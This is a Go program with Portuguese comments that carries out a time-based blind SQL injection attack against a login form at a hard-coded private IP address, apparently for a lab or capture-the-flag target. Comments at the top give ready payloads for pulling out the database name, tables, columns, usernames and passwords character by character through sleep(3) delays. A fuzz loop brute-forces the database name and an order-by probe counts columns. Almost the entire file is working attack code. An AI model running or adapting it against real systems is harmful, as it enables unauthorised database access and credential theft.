package SQLi_Blind_Time_Based

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

// Exemplos de queries SQL para diferentes propósitos:
//
// Para descobrir o nome do banco de dados:
// query := "' union select 1,2,if(substring((select database()),1," + strconv.Itoa(len(guessDB)) + ")='" + guessDB + "',sleep(3),NULL) -- -"
//
// Para descobrir os nomes das tabelas:
// query := "' union select 1,2,if(substring((select table_name from information_schema.tables where table_schema = 'cc' limit 0,1),1," + strconv.Itoa(len(guessDB)) + ")='" + guessDB + "',sleep(3),NULL) -- -"
//
// Para descobrir os nomes das colunas:
// query := "' union select 1,2,if(substring((select column_name from information_schema.columns where table_name = 'users' and table_schema='cc' limit 0,1),1," + strconv.Itoa(len(guessDB)) + ")='" + guessDB + "',sleep(3),NULL) -- -"
//
// Para descobrir o username:
// query := "' union select 1,2,if(substring((select login from users limit 0,1),1," + strconv.Itoa(len(guessDB)) + ")='" + guessDB + "',sleep(3),NULL) -- -"
//
// Para descobrir a senha:
// query := "' union select 1,2,if(substring((select password from users limit 0,1),1," + strconv.Itoa(len(guessDB)) + ")='" + guessDB + "',sleep(3),NULL) -- -"

// req envia uma requisição POST para o endpoint fornecido com os parâmetros "username" e "password".
func req(query string) string {
	targetURL := "http://10.10.0.27" // ALTERE AQUI O ENDPOINT
	data := url.Values{}
	data.Set("username", query)
	data.Set("password", "aaas")

	resp, err := http.PostForm(targetURL, data)
	if err != nil {
		fmt.Println("Erro na requisição:", err)
		return ""
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Erro ao ler o corpo da resposta:", err)
		return ""
	}
	return string(body)
}

// fuzz testa cada caractere de "printables" para descobrir, caractere a caractere, o nome do banco de dados.
// Ele monta o payload SQL preparado para acionar delay (sleep) caso o palpite esteja correto.
func fuzz() {
	printables := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ " // imprime os caracteres
	nomeDB := ""
	for {
		for _, char := range printables {
			guessDB := nomeDB + string(char)
			// Cria o payload utilizando substring e sleep para indicar acerto
			query := "' union select 1,2,if(substring((select database()),1," + strconv.Itoa(len(guessDB)) + ")='" + guessDB + "',sleep(3),NULL) -- -"
			fmt.Println("Tentando:", guessDB)
			startTime := time.Now()
			req(query)
			elapsed := time.Since(startTime)
			// Se o tempo de resposta for maior ou igual a 3 segundos, assume-se que o palpite está correto
			if elapsed >= 3*time.Second {
				nomeDB = guessDB
				break
			}
		}
	}
}

// orderby testa a ordenação da consulta para identificar onde a query é executada corretamente.
// Para cada número, ele envia um payload que ordena os resultados e verifica a mensagem de erro.
func orderby() {
	numeros := []int{1, 2, 3, 4, 5, 6, 7, 8, 9}
	for _, num := range numeros {
		query := "' or 1=1 order by " + strconv.Itoa(num) + " -- -"
		fmt.Println("Testando com número:", num)
		resp := req(query)
		if !strings.Contains(resp, "Username or password is invalid!") {
			fmt.Println("Union correct:", num)
		}
	}
}

func main() {
	// Escolha qual função executar: fuzz ou orderby
	fuzz()
	// orderby() // Descomente para testar a função orderby
}
